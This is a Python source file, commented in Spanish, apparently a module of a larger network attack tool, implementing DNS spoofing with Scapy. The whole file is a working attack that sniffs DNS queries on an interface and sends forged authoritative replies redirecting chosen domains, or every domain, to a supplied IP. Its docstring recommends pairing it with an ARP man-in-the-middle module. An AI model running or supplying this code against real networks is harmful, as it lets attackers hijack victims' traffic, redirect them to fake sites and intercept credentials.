"""DNS spoofing. Escucha consultas DNS y responde con una IP falsa antes de
que llegue la respuesta legitima. Funciona mejor combinado con el MITM ARP,
porque asi las consultas pasan por nuestra maquina."""
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, AsyncSniffer, send

from core.bus import bus


class DnsSpoofer:
    def __init__(self, iface: str, mapping: dict[str, str] | None = None,
                 spoof_all_to: str | None = None):
        self.iface = iface
        self.mapping = mapping or {}
        self.spoof_all_to = spoof_all_to or None
        self._sniffer: AsyncSniffer | None = None

    def _match(self, qname: str) -> str | None:
        qname = qname.rstrip(".").lower()
        for domain, ip in self.mapping.items():
            d = domain.rstrip(".").lower()
            # Matching exacto de dominio (o subdominio), no substring.
            if qname == d or qname.endswith("." + d):
                return ip
        return self.spoof_all_to

    def _process(self, pkt) -> None:
        if not pkt.haslayer(IP):
            return  # IPv6 (u otros): sin capa IPv4 no podemos construir la respuesta
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR)):
            return
        qname = pkt[DNSQR].qname.decode(errors="ignore")
        spoof_ip = self._match(qname)
        if not spoof_ip:
            return
        response = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst)
            / UDP(dport=pkt[UDP].sport, sport=53)
            / DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=spoof_ip),
            )
        )
        send(response, iface=self.iface, verbose=0)
        bus.emit({"type": "dns", "msg": f"{qname.rstrip('.')} -> {spoof_ip}"})

    def start(self) -> None:
        self._sniffer = AsyncSniffer(iface=self.iface, filter="udp port 53",
                                     prn=self._process, store=False)
        self._sniffer.start()
        bus.emit({"type": "dns", "msg": "DNS spoofing activo"})

    def stop(self) -> None:
        if self._sniffer:
            try:
                self._sniffer.stop()
            except Exception:
                pass
        bus.emit({"type": "dns", "msg": "DNS spoofing detenido"})
